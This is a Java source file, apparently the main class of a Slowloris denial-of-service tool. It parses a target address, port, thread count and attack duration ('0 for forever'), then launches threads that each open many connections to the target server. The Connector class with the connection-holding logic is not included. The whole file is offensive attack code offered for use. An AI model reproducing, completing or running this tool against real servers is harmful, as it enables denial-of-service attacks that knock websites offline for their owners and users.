package com.company.SlowLoris;

import java.net.MalformedURLException;

public class Main {

    public static void main(String[] args) {

        if (args.length !=4){
            die("Example usage:\n\t\tjava jSlowLoris TARGET PORT NUMBER_OF_THREADS TIMER\n\t\tTARGET the address of the target\n\t\tPORT the port on the target server to connect to\n\t\tNUMBER_OF_THREADS how many threads the program should create. Each thread has 50 associated connections\n\t\tTIMER how long the attack should last in minutes. Use 0 for forever");
        }

        int port = 0;
        int threads = 0;
        int timer = 0;

        try {
            port = Integer.parseInt(args[1]);
            threads = Integer.parseInt(args[2]);
            timer = Integer.parseInt(args[3]);
        } catch (NumberFormatException nfe){
            die(nfe.getMessage());
        }

        for (int i = 0; i < threads ; i++) {

            try {
                Connector connector = new Connector(args[0], port, timer);
                new Thread(connector).start();
            } catch (MalformedURLException mue){
                die(mue.getMessage());
            }
        }
    }

    private static void die(String deathMsg){
        System.err.println(deathMsg);
        System.exit(-1);
    }
}
